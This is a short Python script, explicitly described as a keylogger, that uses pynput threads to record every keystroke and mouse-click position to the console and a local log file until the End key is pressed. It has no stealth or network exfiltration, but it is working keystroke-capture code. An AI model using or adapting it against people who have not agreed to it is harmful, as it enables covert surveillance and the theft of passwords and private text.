"""Simple keylogger function based on multi thread.

Functions:
    mouse_keyboard_logger: 
        logs both at the same time using multi thread.
logger:
    Logs INFO level to console and "keylogger.log" file.
Third party imports:
    pynput (pip install pynput)
"""

import threading
import logging

from pynput.keyboard import Key, Listener as k_listener
from pynput.mouse import Listener as m_listener

# logger
logger = logging.getLogger(__name__)
console_handler = logging.StreamHandler()
logger.addHandler(console_handler)
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%m/%d/%Y %I:%M:%S %p",
    filename="keylogger.log",
    encoding="utf-8",
    level=logging.INFO,
)


def mouse_keyboard_logger() -> None:
    """Listens to mouse and keyboard; Saves to a file.

    Args:
        None
    Retruns:
        None
    Logs all keys pressed on keyboard and mouse position(clicks).
    Prints and saves them(to the "logging.log").
    """

    flag = True

    def _keyboard_events(key):
        if key == Key.end:
            logger.info("Finished with pressing %s", key)
            logger.info("%s Finished %s", "=" * 30, "=" * 30)
            nonlocal flag
            flag = False
            return False
        logger.info(key)
        return True

    def _mouse_events(x, y, button, pressed):
        if pressed:
            logger.info((x, y, button))

    def _m_listen():
        mouse_listen = m_listener(on_click=_mouse_events)
        mouse_listen.start()

    def _k_listen():
        key_listen = k_listener(on_press=_keyboard_events)
        key_listen.start()

    logger.info("%s Started %s", "=" * 30, "=" * 30)
    k_thread = threading.Thread(target=_k_listen)
    m_thread = threading.Thread(target=_m_listen)

    m_thread.start()
    k_thread.start()

    while flag:
        k_thread.join()
        m_thread.join()


# Test
mouse_keyboard_logger()
